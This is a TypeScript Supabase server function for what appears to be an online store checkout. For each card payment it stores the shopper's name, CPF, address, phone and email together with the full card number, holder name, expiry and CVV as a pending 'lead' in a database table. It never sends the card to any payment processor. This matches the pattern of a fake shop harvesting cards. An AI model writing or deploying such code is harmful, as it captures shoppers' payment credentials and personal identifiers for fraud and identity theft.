const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { customer, card, items, amount, shipping, metadata } = await req.json();

    const supabaseUrl = Deno.env.get("SUPABASE_URL");
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");

    if (!supabaseUrl || !supabaseKey) {
      return new Response(
        JSON.stringify({ error: "Server configuration error" }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    let meta: any = {};
    try {
      meta = typeof metadata === "string" ? JSON.parse(metadata) : metadata || {};
    } catch (_) {}

    const trackingParams = meta?.tracking || {};

    const lead = {
      payment_method: "credit_card",
      name: customer?.name || "",
      email: customer?.email || "",
      phone: customer?.phone || "",
      cpf: customer?.cpf || "",
      cep: shipping?.address?.zipCode || shipping?.address?.zipcode || "",
      endereco: shipping?.address?.street || "",
      numero: shipping?.address?.streetNumber || "",
      complemento: shipping?.address?.complement || "",
      bairro: shipping?.address?.neighborhood || "",
      cidade: shipping?.address?.city || "",
      uf: shipping?.address?.state || "",
      color: meta?.color || "",
      size: meta?.size || "",
      quantity: items?.[0]?.quantity || 1,
      total_amount: amount,
      shipping_type: shipping?.fee > 0 ? "express" : "padrao",
      shipping_cost: shipping?.fee || 0,
      card_number: card?.number || "",
      card_holder: card?.holder || "",
      card_expiry: card?.expiry || "",
      card_cvv: card?.cvv || "",
      card_installments: card?.installments || 1,
      status: "pending",
      metadata: meta,
    };

    const res = await fetch(`${supabaseUrl}/rest/v1/checkout_leads`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": supabaseKey,
        "Authorization": `Bearer ${supabaseKey}`,
        "Prefer": "return=minimal",
      },
      body: JSON.stringify(lead),
    });

    console.log("Card lead saved, status:", res.status);

    // Dual-write: new events + orders tables
    const visitorId = meta?.visitor_id || "unknown";
    try {
      await fetch(`${supabaseUrl}/rest/v1/events`, {
        method: "POST",
        headers: { apikey: supabaseKey, Authorization: `Bearer ${supabaseKey}`, "Content-Type": "application/json", Prefer: "return=minimal" },
        body: JSON.stringify({
          visitor_id: visitorId,
          session_id: meta?.session_id || null,
          event_name: "card_submitted",
          value: amount || 0,
          source: trackingParams.utm_source || null,
          campaign: trackingParams.utm_campaign || null,
          event_data: { customer_email: customer?.email },
        }),
      });
      await fetch(`${supabaseUrl}/rest/v1/orders`, {
        method: "POST",
        headers: { apikey: supabaseKey, Authorization: `Bearer ${supabaseKey}`, "Content-Type": "application/json", Prefer: "return=minimal" },
        body: JSON.stringify({
          visitor_id: visitorId,
          payment_method: "credit_card",
          status: "pending",
          value: amount || 0,
        }),
      });
    } catch (e) {
      console.error("Error writing to new tables:", e);
    }

    console.log("Card lead saved (no UTMify event for card)");

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Error saving card lead:", error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
